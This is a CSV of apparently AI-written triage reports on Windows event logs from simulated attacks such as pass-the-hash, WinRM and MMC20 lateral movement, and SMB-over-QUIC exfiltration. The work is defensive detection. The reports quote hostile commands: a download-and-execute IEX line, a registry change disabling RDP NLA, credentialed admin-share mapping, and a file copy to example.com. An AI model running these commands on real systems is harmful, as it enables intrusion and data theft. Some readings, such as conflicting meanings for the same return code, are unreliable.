Directory Name,AI Response
Enable Windows Remote Management,"Upon analyzing the provided event logs from the Windows host, several key observations can be made:

### Application Log
- Windows Defender is active as indicated by the `SECURITY_PRODUCT_STATE_ON` state. This suggests that basic security operations are in place.

### Windows PowerShell Log
- The logs contain multiple entries showing the execution of PowerShell through `powershell.exe` with the command `{Enable-PSRemoting -Force}`. `Enable-PSRemoting -Force` is used to configure a machine to receive remote PowerShell commands, which could be typical for administrative tasks but could also be leveraged by malicious actors if not sanctioned or expected.

### System Log
- Events related to Windows Update indicate security intelligence updates for Microsoft Defender Antivirus were successfully processed. Such update processes are regular maintenance tasks.

### Security Log
- Audit logs show several login activities from a user account named `admin_test` with elevated privileges (such as `SeDebugPrivilege`). The account logs in using NTLM authentication and a type 3 logon (network-based logon). While administrative accounts often have such privileges, it's worth considering whether the logons align with expected user activity, especially given the use of network-based logins.

### Sysmon Log
- The significant processes observed or executed during the log timeframe include:
  - `wevtutil.exe`, `conhost.exe`, and `whoami.exe`, all running under the `admin_test` account with high integrity levels.
  - `wuauclt.exe`, responsible for Windows Update, and `MicrosoftEdgeUpdate.exe`, executed by NT AUTHORITY\SYSTEM, suggest normal system and application update behavior.

### Key Observations and Assessment

1. **PowerShell Remoting**: The command `{Enable-PSRemoting -Force}` is used to enable PowerShell Remoting on a system. While it can be part of legitimate administrative tasks, it might also pose a risk when performed unexpectedly, as it allows for remote command execution. This requires further verification against expected configuration changes or administrative tasks scheduled during the timeframe.

2. **Administrative Logon**: The `admin_test` account has privileged operations (e.g., using `SeDebugPrivilege`, known for tracing and debugging operations). The network-based login from specific IPs, logged with NTLM methods, suggests potential remote access which needs validation against legitimate remote access scenarios.

3. **Regular Updates**: The successful application of Windows Defender updates ensures ongoing protection from known threats, which reflects benign routine maintenance behavior.

Based on these observations, the log activities exhibit some elements that could be typical for system administration (such as enabling remoting and network logins using administrative credentials), yet they present potential avenues for compromise if unsanctioned. Hence, the resolution is:
- **SUSPICIOUS** - Specific activities warrant further investigation to ensure they align with sanctioned administrative activities, mainly the unexpected enabling of PSRemoting and privileged network logins. Validation from system administrators regarding these activities should be sought to rule out unauthorized access or changes."
PowerShell Lateral Movement using MMC20,"### Analysis of the Windows Event Logs:

**1. PowerShell Logs:**
- Recurring PowerShell script executions using `activator` to run `calc.exe` are evident. The PowerShell command is:
  ```powershell
  powershell.exe & {[activator]::CreateInstance([type]::GetTypeFromProgID(\""MMC20.application\"",\""localhost\"")).Document.ActiveView.ExecuteShellCommand(\""c:\\windows\\system32\\calc.exe\"", $null, $null, \""7\"")}
  ```
- This method of launching Calc via PowerShell and the Microsoft Management Console (`MMC20.application`) could indicate an attempt to hide or mask actions, as PowerShell is often used in scripted attacks.
  
**2. Sysmon Logs:**
- Multiple processes involving `wmiprvse.exe`, `conhost.exe`, and `wevtutil.exe` seem to be executed by the user `SERVER002\admin_test`. These appear normal, but their correlation with powershell activity could indicate evasive measures or administrative tasks.
- The presence of `calc.exe` running under the context of `mmc.exe` confirms the above PowerShell execution.
- There are entries related to the Microsoft Edge Update processes like `MicrosoftEdgeUpdate.exe` and related installers. These processes run under the `NT AUTHORITY\SYSTEM` user, which matches standard behavior for legitimate software updates.

**3. Security Logs:**
- The `admin_test` user has been granted privileges typical for administrative tasks (e.g., `SeDebugPrivilege`), which could be typical but requires monitoring if coupled with unauthorized activities.
- Event ID 4624 shows a logon session, indicating `admin_test` logging in remotely, which might be suspicious depending on the organization's policies.

**4. System and Application Logs:**
- Show normal operations such as Windows Updates and security intelligence updates for Microsoft Defender, which are benign.

### Conclusion:

- The execution of PowerShell with the specific command demonstrates suspicious behavior typically seen in attack simulations or red teaming exercises. The misuse of PowerShell to execute common executables like `calc.exe` often suggests an experimentation of payload execution or command and control setups.
- Other events, while typical, are contextually concerning given their sequence and alignment with the PowerShell executions.

### Assessment:
- **Resolution:** SUSPICIOUS

### Guidance:
- Conduct a more thorough review of PowerShell logging for any additional scripts executed in a similar manner.
- Ensure proper security monitoring is enabled to detect unusual PowerShell usage and potential privilege abuse.
- Verify the activity of `admin_test` with the team responsible for managing the system; unusual remote logins need scrutiny.
- Implement restrictions or monitoring rules to prevent suspicious PowerShell command executions and escalate alerts when detected."
Exfiltration Over SMB over QUIC (NET USE),"### Detailed Analysis

#### System Log:
- **Time Changes**: Events indicate minor changes in system time, controlled by `svchost.exe`. This can often be part of normal time synchronization but can also be indicative of attempts to obscure activity.
- **Synced Time Source**: Synchronization with an NTP server, `time.windows.com`. This is a standard operation for Windows systems to ensure their system time is accurate.

#### Application Log:
- **SPP (Software Protection Platform Service)**: Regular logging from the Software Protection Platform, showing time-stamped activities without any errors or anomalies.
- **Edge Update Service**: The `edgeupdate` service entries suggest that the update service stopped. This isn't inherently suspicious unless repeating frequently without completion.

#### Sysmon Log:
- **Wevtutil Usage**: This tool is used for managing Windows event logs. Its appearance here can indicate either normal administrative activity or attempts to delete or search logs to cover tracks.
- **Powershell Usage**: PowerShell runs a command that includes `NET USE` with the `/SKIPCERTCHECK` flag and copying files. This can often be seen with administrative tasks but is also a recognizable pattern for lateral movement or data exfiltration.
- **Whoami and Hostname Execution**: Usage for checking logged user information and network identification, respectively. This might be routine or part of an initial reconnaissance phase during an attack.
- **Frequent Edge Update Processes**: Multiple Edge Update processes recorded, consistent with legitimate application update behavior.

#### Windows PowerShell Log:
- **Command Execution**: The command executed in PowerShell involving `NET USE` and file copying is suspicious as it utilizes the `/SKIPCERTCHECK` flag which bypasses certificate validation, often a red flag in scripts used for lateral movement or data transfer without security checks.

#### Security Log:
- **Time Synchronization Events**: Echoes changes from the System log regarding system time adjustments, confirming synchronization processes are taking place.

### Assessment
- The main area of concern is the execution of PowerShell commands with parameters such as `/SKIPCERTCHECK`. This behavior typically warrants suspicion as it can represent data exfiltration or lateral movement efforts while avoiding certificate checks.
- The presence of `wevtutil` could suggest operational tasks, but, in combination with other activity, could also hint at potential log manipulation efforts.
- The overall activities logged show a mix of potentially concerning behaviors that, given the networked environment, require more investigation, particularly focusing on the actors, their intentions, and end-goals.

### Resolution
**Resolution: SUSPICIOUS**

While no activity immediately screams ""malicious,"" there are clear signs that warrant deeper investigation. The use of PowerShell with parameters that avoid security protocols, alongside possibly legitimate wevtutil executions, concerns around potential log tampering, and synchronized infrastructure tasks suggest that further scrutiny is essential to rule out a security incident.

### Guidance
- Review completeness of logged PowerShell script invocations and correlate them with known administrator tasks.
- Investigate the purpose and context for wevtutil use thoroughly.
- Verify if the PowerShell script resulted in any unauthorized data movement.
- Monitor for further instances of this behavior, watch network logs for unexpected connections, especially outbound to unknown destinations.
- Conduct a security posture review focused on maintaining 'least privilege' principles and tighten PowerShell execution policies."
Execute command writing output to local Admin Share,"**Analysis Summary:**

The logs provided primarily contain System, Security, and Sysmon logs, with a single Application log event related to Windows Defender. Here is a detailed analysis of the logs:

1. **Time Synchronization Events:**
   - Repeated adjustments to the system time were observed (System logs 3566 and Security logs 30335 & 30336). The adjustments appear to be small and likely reflect routine time synchronization, potentially through a service like `w32time`, which is typical for maintaining accurate time within the system. 

2. **Windows Update Events:**
   - Numerous logs (System logs 3570, 3571, and 3572) show activity related to Windows Defender Antivirus updates. These are legitimate updates, as indicated by the presence of `wuauclt.exe`, `AM_Delta.exe`, and `MpSigStub.exe` processes in the Sysmon logs (17963 - 17965). These processes relate to Windows Update and Defender's signature updates, which are normal operations.

3. **Sysmon Process Creation:**
   - The Sysmon logs detail normal system process activity. Processes such as `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, `whoami.exe`, and `cmd.exe` were executed by the `admin_test` user. The specific command line observed in event id 17953, `""cmd.exe"" /c cmd.exe /Q /c hostname 1> \\127.0.0.1\ADMIN$\output.txt 2>&1`, is unusual but not inherently malicious. It redirects command output locally, likely for diagnostic purposes, and doesn't demonstrate any overtly malicious intent.

4. **Security Log Credential Events:**
   - Security log events (30337 - 30343) reveal multiple instances of Event ID 5379 related to credential validation, all unsuccessful (`ReturnCode 3221226021`), against what appears to be a Microsoft Account. This could be indicative of misconfiguration, or unsuccessful attempts to validate network credentials. Without further context, there is no evidence of compromise, but this area may require monitoring for potential issues.

5. **Application Log:**
   - A single Application log (2383) indicates that Windows Defender is active and operational, reported as `SECURITY_PRODUCT_STATE_ON`. This is a positive sign of the system's antivirus health state.

**Conclusion:**

The logs analyzed primarily show routine system maintenance activities like time synchronization and Windows Update processes. The unsuccessful credential validation attempts could point to benign misconfiguration or unsuccessful authentication attempts, warranting closer monitoring but not indicating definite malicious activity at this time.

**Resolution: SUSPICIOUS**

Although there's no direct evidence of malicious activity, the combination of unusual command-line usage and unsuccessful credential validation needs further investigation. Continuous monitoring and assessment are recommended, focusing particularly on any additional authentication failures or anomalous command executions."
Rubeus Kerberos Pass The Ticket,"Based on the analysis of the provided Windows event logs, several indicators point towards potentially malicious activities on the Windows host (Server002). Here's a detailed breakdown:

### Analysis:

1. **PowerShell Activity:**
   - There are multiple entries in the Windows PowerShell logs indicating execution of scripts with administrative privileges. Specifically, the execution of ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\script.exe"" with sensitive parameters like `/user:Administrator /password:Password`.
   - These PowerShell commands involve password handling and ticket (TGT and TGS) requests which are common in lateral movement or credential harvesting techniques (e.g., Pass-the-Ticket in Kerberos attacks).

2. **Sysmon Logs:**
   - The Sysmon logs show a PowerShell process being spawned by a wsmprovhost.exe process with high integrity. The command line suggests execution of a script that looks consistent with gaining unauthorized access or persistence mechanisms.
   - There are executions of ""C:\Windows\PSEXESVC.exe"", a tool commonly used for lateral movement and remote execution without the need for explicit credentials, which can be a sign of misuse in a malicious context.

3. **Service Control Manager Log:**
   - A new service ""PSEXESVC"" was created and set to demand start. This service is associated with PsExec, a Sysinternals tool, often used for remote administration, but frequently employed by attackers to execute commands on remote systems without triggering defenses.

4. **Behavioral Indicators:**
   - The combination of PowerShell scripts attempting to manage Kerberos tickets, the presence of PsExec, and rapid creation of services, demonstrates actions typical of an attacker trying to escalate privileges or move laterally within a network.

### Resolution:
Given the consistencies with known attack techniques and the presence of suspicious command executions aiming at privilege escalation and lateral movement, the activity seen within these logs can be classified as **MALICIOUS**.

### Recommendations:
- **Immediate Containment:** Disconnect affected host (Server002) from the network to prevent further spread.
- **Forensic Investigation:** Perform a detailed forensic analysis to identify the initial access vector and assess any lateral movement.
- **Credential Audit:** Change all potentially compromised credentials, especially those of privileged accounts observed in the logs.
- **Review Security Controls:** Enhance monitoring and restrictions on tools like PowerShell and PsExec, and apply least privilege principles.
- **Patch Management:** Verify the system is up-to-date with security patches, specifically focusing on Windows updates. 

This malicious activity assessment advises a thorough review and immediate action to address potential security breaches."
Remote Code Execution with PS Credentials Using Invoke-Command,"Upon analyzing the provided Windows event logs, several observations can be made concerning suspicious or anomalous behavior potentially indicative of malicious activity:

1. **Security Logs:**
   - Event ID 4672 indicates that the user ""admin_test"" was granted a series of high-level privileges, including `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`. These privileges are typically granted to administrators and can be abused for malicious purposes such as privilege escalation or lateral movement within the network.
   - There are multiple logon events (4624) and logoff events (4634) for both the user ""admin_test"" and the ""ANONYMOUS LOGON"" user. The ANONYMOUS LOGON entries, particularly when using NTLM, could suggest potential exploitation of a legacy authentication method or an attempt to access resources without proper authentication.
   - Event ID 5379 indicates attempts to read Microsoft Account credentials with a return code suggesting failure (`3221226021` indicates access denied), possibly pointing towards credential harvesting attempts.

2. **Windows PowerShell Log:**
   - The PowerShell log entries show usage of `Enable-PSRemoting` and an invocation of `whoami` command. This could indicate an attempt to enable PowerShell remoting, which might be used to execute commands remotely if not expected as part of regular operations. This is suspicious given the context and privileges of user ""admin_test"".

3. **Sysmon Logs:**
   - Event ID 1 logs show processes like `powershell.exe`, `whoami.exe`, and `wsmprovhost.exe` being executed. The command to enable PSRemoting and run `whoami` fits a typical pattern for recognizing current privileges and possibly escalating them.
   - The presence of `wevtutil.exe` tool usage could suggest attempts to query or manipulate event logs to cover tracks.

4. **Other Logs (Application, System):**
   - Routine processes like security updates and Microsoft Edge Update activities are observed which align with typical Windows maintenance tasks, showing benign entries for updating Defender and Edge.
   - However, a high-frequency of update-related logs within the short time frame could suggest potential misuse of system service for malicious purposes but nothing concrete is evident from these entries alone.

**Assessment and Resolution:**

Examining these logs in context, there are multiple elements that collectively suggest the potential for malicious activities, especially surrounding the usage of high-level privileges, remote PowerShell command execution, and anonymous logon attempts.

Final Resolution: **SUSPICIOUS**

Despite the lack of direct evidence of compromise, the combination of high-privilege logon events, PowerShell remoting activities, unauthorized credential read attempts, and the use of administrative tools warrants further investigation. Recommended steps include:
- Review and confirm the necessity and legitimacy of privileged operations involving ""admin_test"".
- Analyze network logs and additional host-based evidence to clarify remote command execution intentions.
- Consider implementing stricter PowerShell logging, network segmentation, and monitoring to detect and prevent potential misuse.
- Verify that all suspicious logon activities and processes serve a legitimate purpose or are authorized by IT policy."
Disable NLA for RDP via Command Prompt,"After analyzing the provided logs, here is a detailed analysis and assessment of the situation:

**1. Time Manipulation:**
- Multiple entries in the System and Security logs indicate changes to the system time (`EventID: 4616`). These changes were executed by `svchost.exe` with the `LOCAL SERVICE` account. While legitimate system processes can change time settings (such as updates or system synchronization), frequent and unexplained changes could be an indicator of an attacker attempting to obscure their tracks or alter time-sensitive logs.

**2. Privilege Use:**
- EventID 4672 in the Security log indicates that the user `admin_test` received special privileges, such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and more. These are high-level privileges often exploited in lateral movement or privilege escalation attacks.

**3. Command Execution:**
- Sysmon logs show the execution of a command via `cmd.exe` to modify a registry key within RDP settings, disabling `UserAuthentication`. The related command is: `cmd.exe /c reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v UserAuthentication /d 0 /t REG_DWORD /f`. Altering these settings could be part of an attack to weaken RDP security, allowing unauthorized remote access.

**4. Process Execution:**
- The Sysmon logs also indicated the execution of numerous system utilities like `whoami.exe`, `reg.exe`, and `wevtutil.exe`, all under the `admin_test` account. While these utilities could be used legitimately, their combination and context suggest a deeper reconnaissance or configuration change, potentially by an attacker.

**5. Unusual Network Authentication:**
- EventID 4624 and EventID 4634 show logon and logoff events for `admin_test`, applying NTLM authentication from a workstation `DESKTOP-3HL5B2P`. Unfamiliar or unexpected logins, especially using NTLM, can be indicative of a compromised account.

**6. Updates:**
- The logs contain entries for legitimate Microsoft Defender updates (`EventID: 44` and `EventID: 43`). These do not present any immediate concern and appear to be regular update operations.

**Assessment:**
The combination of high-level privilege granting, system time manipulation, registry alterations, and command-line executions under an admin account and NTLM authentication suggests potential unauthorized access and suspicious activity.

**Resolution: SUSPICIOUS**

**Guidance on how to proceed:**
- Conduct a thorough review and audit of `admin_test` account activity.
- Investigate the source of the NTLM authentication from `DESKTOP-3HL5B2P`.
- Perform a full forensic analysis on the system, checking for possible malware or unknown modifications.
- Consider restoring the RDP security settings and monitor for any changes.
- Strengthen access controls and logging around sensitive actions and accounts.
- Report findings to the incident response team and decide on containment and remediation steps as necessary."
crackmapexec Pass the Hash,"After reviewing the logs provided, here are the key findings:

1. **Security Log Analysis:**
   - The sequence of events indicates a privilege escalation attempt by the user `admin_test`. The event ID 4672 shows `admin_test` being granted a wide range of privileges, which include `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, often associated with potentially malicious activities.
   - Event ID 4624 signifies a successful logon using the NTLM protocol from a workstation named `DESKTOP-3HL5B2P`, which is notable, depending on whether this is an expected or authorized access pattern.

2. **System Log Analysis:**
   - The system logs show some inconsequential time synchronization events and general service activities which do not indicate a direct issue or anomaly.

3. **Application Log Analysis:**
   - The `edgeupdate` service stopped message appears regularly, which could indicate either a maintenance action or a scripted activity. However, on its own, it doesn’t evoke suspicion unless correlated with abnormal software update patterns.

4. **Sysmon Log Analysis:**
   - The Sysmon logs reflect process activities such as `powershell.exe` (PID 3728) and several instances of `wevtutil.exe`, which could suggest a potential reconnaissance or data exfiltration activity if these processes were not expected to run.
   - Of particular note is the execution of `cmd.exe` with a command line invoking a potentially suspicious script `C:\\scriptWin\\script.exe`, involving user `Administrator`. The command line arguments used with this script (`-u Administrator -H cc36cf7a8514893efccd3324464tkg1a`) indicate potential credential manipulation or an unauthorized operation.

5. **Anomalies & Suspicious Patterns:**
   - Frequent invocation of `wevtutil.exe`, a Windows Event Log utility, under the same user (admin_test) suggests potential cleanup or log tampering attempts.
   - The PowerShell activity and script invocation potentially imply the use of scripts for illicit activities.
   - Numerous processes executed under `NT AUTHORITY\\SYSTEM` are typical for background tasks and updates but multiple rapid sequences could indicate a misconfiguration or exploitation script aiming at persistence.

**Assessment & Recommendation:**
Based on the logs provided, the behavior observed, especially concerning privilege escalation and potential unauthorized script execution, is deemed **SUSPICIOUS**. It warrants a deeper investigation focusing on determining the intent behind the scripts, verifying legitimate access to resources, and confirming whether these escalated privileges and process executions correlate with normal operational patterns.

**Resolution: SUSPICIOUS**
- Conduct a detailed investigation on the user accounts, `DESKTOP-3HL5B2P` connectivity, and related processes.
- Review Group Policy Settings and audit logs for privileged operations.
- Monitor real-time activities and network connections to detect and respond to potential threats quickly.
- If not already in place, implement further logging, and consider endpoint detection and response solutions for enhanced visibility."
WinRM Access with Evil-WinRM,"Upon analyzing the provided event logs from the Windows machine 'Server002', several key observations indicate potential unauthorized activity:

1. **Security Log (Event ID 4624 & 4672)**:
   - There are multiple logon events (Event ID 4624) using the SYSTEM account (`S-1-5-18`) with elevated privileges, including `SeDebugPrivilege` and others typically not used in regular operations. This behavior is typical of actions that require system-level access and could indicate privilege escalation.

2. **Sysmon Log**:
   - Repeated execution of `powershell.exe` (Event ID 1, Process ID 4392) with a suspicious command line argument: `script -i Target -u Domain\\Administrator -p P@ssw0rd1`. This suggests an attempt to automate tasks or execute scripts with administrative credentials.
   - Frequent invocation of `wevtutil.exe` (Event ID 5). The use of this utility may indicate attempts to manipulate or clear event logs, often a tactic to hide malicious actions.
   - `wsmprovhost.exe` and `whoami.exe` processes are executed under the context of a user (`SERVER002\\admin_test`), consistent with checking privileges or identity in potential lateral movement.

3. **PowerShell Log**:
   - Corresponding with the Sysmon log entries, the PowerShell logs show suspicious usage of PowerShell to possibly automate or execute commands with elevated privileges. The usage of an explicit password in command lines is a red flag.
  
4. **General Observations**:
   - The tools and patterns suggest an attacker might have gained administrative access, potentially using stolen credentials, and attempted credential harvesting or lateral movement across the network.
   - The consistent process execution and elevated operations suggest potential malicious activity possibly aiming for persistence or data exfiltration.

**Assessment**:
Given the analysis, these logs exhibit behaviors typically associated with unauthorized access or potential compromise. The observed `powershell.exe` command-line usage with clear-text credentials is especially alarming.

**Resolution**: MALICIOUS

**Guidance**:
- Immediately isolate the system to prevent further unauthorized access or potential damage.
- Conduct a full memory dump and forensic analysis on 'Server002' to identify and understand the scope of potential compromise.
- Reset all potentially compromised credentials, especially those with administrative privileges.
- Review network traffic patterns to identify and potentially block further unauthorized access.
- Consider implementing enhanced monitoring and security measures, such as multi-factor authentication and advanced endpoint detection, to prevent future incidents."
Invoke-WMIExec Pass the Hash,"**Analysis:**

The event logs provided contain various entries from Sysmon, Application, Windows PowerShell, Security, and System logs. After analyzing these logs, several potential indicators of suspicious or malicious activity have been identified:

1. **PowerShell Execution**:
   - There's a PowerShell execution with a script downloaded from an external URL:
     ```plaintext
     powershell.exe & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12,
     IEX (IWR 'https://raw.githubusercontent.com/script/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/script.ps1' -UseBasicParsing);
     ```
   - The use of `IEX (Invoke-Expression)` with `IWR (Invoke-WebRequest)` to pull and execute a script from a URL is generally suspicious, particularly if this URL is not whitelisted or known to the organization.
   - This command suggests the potential execution of a script from an unverified source, which could be used to introduce malware or execute unauthorized commands.

2. **Frequent Execution of Utilities**:
   - Multiple executions of `wevtutil.exe` and `conhost.exe` by the `admin_test` user in a short span of time. This itself isn't necessarily malicious, but the combination of these with other indicators can suggest malicious behavior.

3. **Change in System Time**:
   - The logs show a change in system time (`EventID: 4616`), which is an unusual operation typically associated with attempts to manipulate timestamps for log creation or to avoid detection from time-based security checks.

4. **Use of Privileged Accounts**:
   - The activities were executed under a high integrity level, often indicating elevated permissions. This activity includes executing administrative commands which, in conjunction with potential malicious scripting (e.g., PowerShell), reinforces the notion of a potential malicious intent.

5. **Command Execution of Common Reconnaissance Tools**:
   - Commands like `hostname.exe` and `whoami.exe` are harmless utilities but are often used by attackers during the reconnaissance phase to gather information about the system and user context.

**Assessment:**
- The combination of executing a remote script via PowerShell, frequent utility execution, changing system time, and privileged account usage are strong indicators of potential compromise.

**Resolution:**
- **MALICIOUS** - Based on the details within these logs, they contain activities that are 100% malicious. The execution of PowerShell with external scripts and manipulation of system time are especially concerning.

**Guidance:**
1. **Isolate the Host**: Immediately isolate the affected machine from the network to prevent further spread or communication with potentially malicious external servers.
2. **Further Investigation**: Conduct a deeper forensic investigation on the system, particularly focusing on downloaded scripts and changes made to the system.
3. **Review Network Logs**: Check network logs for any communication to or from suspicious IP addresses or domains.
4. **User Account Review**: Verify the legitimacy and usage of the `admin_test` account, ensuring it hasn’t been compromised.
5. **Security Controls**: Ensure updated anti-virus/malware tools are in place and consider implementing additional controls for script execution and network communications.
6. **Audit Logs & Alerts**: Improve logging and alerting policies to detect similar activities in the future."
Map admin share,"### Detailed Log Analysis

#### System Log
- All System log events relate to Windows Update Client performing routine security intelligence updates for Microsoft Defender Antivirus. These updates are part of the normal system maintenance and do not imply any malicious activity.
- Event IDs 44, 43, and 19 indicate the normal update process for Security Intelligence, showing no errors or abnormalities.

#### Sysmon Log
- The Sysmon logs show numerous process creations. Some notable entries include:
  - Use of `wevtutil.exe` and `conhost.exe` are common for administrative tasks and console operations, respectively.
  - Execution of `HOSTNAME.EXE`, `whoami.exe`, and `cmd.exe` is observed. These are typical system utilities used for obtaining system or user information.
- **Suspicious Activity:**
  - There is an execution of `cmd.exe` with the command line `""cmd.exe"" /c cmd.exe /c ""net use \\\\Target\\C$ P@ssw0rd1 /u:DOMAIN\\Administrator""`. This command attempts to map a network share using explicit credentials, which is often indicative of lateral movement attempts or unauthorized access attempts.
  - The command's execution and subsequent operations do not display immediate errors or failed attempts in the log but indicate potentially malicious intent.

#### Application Log
- A log entry indicating Windows Defender is active (`SECURITY_PRODUCT_STATE_ON`) is a routine status update and does not indicate any issue.

#### Security Log
- Event ID 4634 indicates a logoff event, while 4624 indicates a successful logon. These events by the user `admin_test` are typical for system usage.
- Event ID 4672 suggests `admin_test` received special privileges upon logon, which is expected for an administrative account.
- Multiple Event ID 5379 relate to attempts with ReturnCode 3221226021, which translates to ""The requested security package does not exist."" This could be related to credential checking or live service interactions, which may not be successful but are not inherently malicious.

### Assessment and Resolution
- **Suspicious**: The execution of a network share command with explicit credentials using `cmd.exe` is concerning for potential lateral movement and indicates an unauthorized access or reconnaissance attempt.
- Other windows event logs do not show any concrete evidence of successful compromise or widespread malicious activity but suggest further investigation to confirm the intent and origin of that command execution.
- It is advisable to examine the circumstances around the `net use` command execution, including reviewing other network and host logs, verifying user access permissions, and possibly contacting the user `admin_test` to validate the activity.

### Guidance on How to Proceed
1. **Immediate Actions**:
   - Investigate the context and execution of the network mapping command found in the Sysmon logs.
   - Verify whether the credentials used (`DOMAIN\\Administrator` and `P@ssw0rd1`) are correct and authorized from a security perspective.
   - Check network logs for any connections to or from `\\\\Target\\C$` around the timestamp of command execution.
2. **Review Access Control**:
   - Audit permissions and recent changes for the account `admin_test` to ensure no unauthorized privilege escalations have occurred.
3. **User Verification**:
   - Engage with the account owner `admin_test` to verify whether this activity was expected or if the account might have been compromised.
4. **Increase Monitoring**:
   - Temporarily enhance monitoring on `Server002` and any potentially affected systems for signs of lateral movement or further suspicious activity.

Given the findings, the situation is marked as **SUSPICIOUS** due to unclear intent behind the network share command execution. Further investigation is needed to rule out or confirm malicious behavior."
Radmin Viewer Utility,"To analyze the provided Sysmon logs from the Windows host, let's focus on identifying any suspicious or potentially malicious activity:
1. **Command Execution with cmd.exe**: There is an event log involving `cmd.exe` being used to execute `""C:\\Program Files (x86)\\Radmin Viewer 3\\Radmin.exe""`. Radmin is a legitimate remote administration tool, but its presence and execution can be a cause for suspicion if not expected on a server, as it can be used for remote control over a machine.

2. **Multiple Executions of 'MicrosoftEdgeUpdate.exe'**: The logs show various executions of `MicrosoftEdgeUpdate.exe` processes, which seems to be part of the normal operation or update process of Microsoft Edge. However, the operations being listed frequently and the command lines used are targeting program files from temp directories, which can be unusual and potentially abused by attackers to masquerade as normal processes.

3. **Usage of PowerShell and Wevtutil**: PowerShell and `wevtutil.exe` (a tool to manage and track event logs) are observed in the logs being executed within seconds intervals. These tools are often used in administrative tasks but could also be used in attack scenarios for log clearing or scripting a malicious process.

4. **Processes Executing under SYSTEM or High Integrity Levels**: Most of the processes, including those cited as concerning (like `Radmin.exe` and those spawned by `MicrosoftEdgeUpdate.exe`), are executing under `NT AUTHORITY\SYSTEM` or with high integrity levels. Security breaches often involve privilege escalation to run harmful activities under elevated privileges. 

5. **Use of WHOAMI Command**: The `whoami.exe` command line execution implies a check of the currently logged-on user information, which is common in scripts or when reconnaissance is being conducted by malicious actors.

6. **Service Stopped Entry**: A log entry in the Application log suggests that a service tied to Edge updates was stopped. While the event itself might be benign adjunct to the update process, in conjunction with the temporary directory execution paths, this raises questions about potentially unintentional service disruption or concealment of malicious activity.

### Final Assessment:

- **Resolution: SUSPICIOUS**
  
The combination of rapid and repeated executions of system utilities, administrative processes like PowerShell and wevtutil, and the peculiar use of Radmin in command execution paths are unusual and could indicate either compromised automated tasks/scripts executing beyond expected behavior scope, or indicative of malware utilizing system processes to hide or execute harmful instructions.

### Guidance to Proceed:

1. **Further Investigation**:
   - Confirm if Radmin Viewer is an authorized tool for this environment. If not, consider it a potential risk for unauthorized remote administration.
   - Review more logs or task schedules that might elucidate the context for the operations observed, especially those continuously executed by MicrosoftEdgeUpdate.exe.
   - Look for subsequent logs involving PowerShell commands for context and any further anomalous behavior.

2. **System and Network Monitoring**:
   - Implement detailed monitoring of this host for any outbound connections made by these processes, especially from `MicrosoftEdgeUpdate.exe` and PowerShell scripts. 
   - Check firewall or network logs for any suspicious or unexpected traffic relating to these processes.

3. **Security Tools and Audits**:
   - Run antivirus/EDR scans across the system for known threats particularly those commonly creating or exploiting temp directory files.
   - Conduct integrity checks on all mentioned binaries, especially those executing from temporary directories.

4. **User and Privilege Review**:
   - Review administrative accounts and ensure all are legitimate and recognise any anomalous privilege escalation attempts. 

Given this is marked as suspicious, diverging more logs or endpoint data could either reaffirm a false positive due to a poorly documented but benign task or escalate it into confirmed malicious activity requiring immediate containment measures."
Map Admin Share PowerShell,"Upon reviewing the provided log entries from the Windows host, the analysis yields the following observations:

### System Log:

1. **Time Change Events:**
   - Multiple events indicate the system time was changed by `svchost.exe`. Changes to the system time by legitimate processes, especially `svchost.exe`, are typically normal and can happen due to NTP synchronization.
   - The time source chosen is `time.windows.com`, which is a legitimate and common time source.

2. **Windows Update Events:**
   - There are logs indicating the installation of security intelligence updates for Microsoft Defender. These are regular update activities and do not appear suspicious.

### Windows PowerShell Log:

- A PowerShell instance created a new PSDrive mapped to `\\Target\C$`. This implies an attempt to access the `C$` administrative share on a remote host.
- The execution of PowerShell commands to mount administrative shares can be a common tactic used in lateral movement during a compromise.

### Sysmon Log:

1. **Process Creation and Execution:**
   - Several instances of legitimate OS processes such as `wevtutil.exe`, `conhost.exe`, `WmiPrvSE.exe`, and `whoami.exe` were executed.
   - The use of `whoami.exe` and `hostname.exe` suggests someone may have been enumerating user and system information.
   - `powershell.exe` was executed with a command mapping a network share, consistent with what was observed in the PowerShell log.

2. **Microsoft Edge Update Activities:**
   - There are entries related to Microsoft Edge updates. These logs appear typical for an auto-update process.

### Security Log:

1. **Privilege Events:**
   - There are indications of special privileges being assigned to the `admin_test` user. The presence of high-level privileges like `SeDebugPrivilege` among others could be normal for an administrative account, but it's something to be cautious of.

2. **Logon Events:**
   - Logon events for the user `admin_test` with NTLM authentication, originating from workstation `DESKTOP-3HL5B2P`, could denote legitimate administrative activity, but careful verification would be ideal.

### Analysis Conclusion:

- The network drive mapping using PowerShell stands out as potentially suspicious activity, especially given that mapping to `C$` implies administrative intent.
- The user `admin_test` has significant privileges and is actively connecting from a desktop, which should be verified for intended usage.
- While a number of activities and processes seem legitimate on the surface, seen in isolation or context stripped, the aggregate could suggest possible anomalous behavior typical of lateral movement or network reconnaissance.

### Resolution:

Given the potential for misuse of administrative capabilities and the network share mapping observed, the logs are assessed as:

**SUSPICIOUS** - These logs contain activities that don't appear entirely legitimate and warrant further investigation, especially concerning the administrative activities over the network. Steps should include reviewing who conducted these actions, checking for any unauthorized network shares, and performing a thorough review of user `admin_test`'s recent activity."
Exfiltration Over SMB over QUIC (New-SmbMapping),"### Analysis of Provided Windows Event Logs

**1. **PowerShell Activity:**
   - An instance of PowerShell was invoked with the command to create a new SMB mapping using the **New-SmbMapping** command to a remote path (`\\example.com\sales`) over QUIC and using the **SkipCertificateCheck** option, followed by a **copy** command to transfer a local file (`C:\path\to\file.txt`) to the mapped drive (`Z:`).
   - This activity is unusual because:
     - PowerShell is known to be used frequently in living-off-the-land attacks due to its capability to execute complex scripts and connect to remote resources easily.
     - The use of **SkipCertificateCheck** is particularly suspicious as it bypasses certificate validation, which could be used to exfiltrate data or interact with untrusted resources.

**2. **Sysmon Logs:**
   - Multiple instances of common Windows utilities like **wevtutil.exe**, **whoami.exe**, and **conhost.exe** are evident. While some usage is typical, the specific context and volume are critical to determine the legitimacy.
